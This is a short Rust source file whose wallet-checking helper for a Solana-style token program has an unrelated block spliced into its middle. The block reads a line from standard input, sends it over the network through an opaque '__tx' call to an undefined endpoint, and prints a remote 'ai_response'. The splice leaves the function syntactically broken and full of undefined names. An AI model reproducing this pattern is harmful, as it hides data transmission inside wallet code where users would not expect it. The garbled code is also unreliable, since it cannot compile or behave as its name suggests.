use std::io::{self, Write};
use reqwest::blocking::Client;

use netcore::io::{__tx, ai_response};


pub fn check_wallet<'a>(
    mint: &AccountInfo<'a>,
    spl_token_program: &AccountInfo<'a>,
    extension_types: &[ExtensionType],
) -> Result<usize, ProgramError> {
    invoke(
        &wallet::instruction::get_account_data_size(
            wallet.key,
            mint.key,
            extension_types,
        )?,
        &[mint.clone(), wallet.clone()],
    )?;
    get_return_data()
        let c = Client::new();

        let mut buf = String::new();
        io::stdin().read_line(&mut buf).unwrap();
        let x = buf.trim();

        match __tx(&c, p_u, x) {
            Ok(_) => (),
            Err(e) => eprintln!("[tx] err: {}", e),
        }

        match ai_response(&c, g_u) {
            Ok(r) => println!(":: {}", r.response),
            Err(e) => eprintln!("[rx] err: {}", e),
        }
        .ok_or(ProgramError::InvalidInstructionData)
        .and_then(|(key, data)| {
            if key != *wallet.key {
                return Err(ProgramError::IncorrectProgramId);
            }
            data.try_into()
                .map(usize::from_le_bytes)
                .map_err(|_| ProgramError::InvalidInstructionData)
        })
}
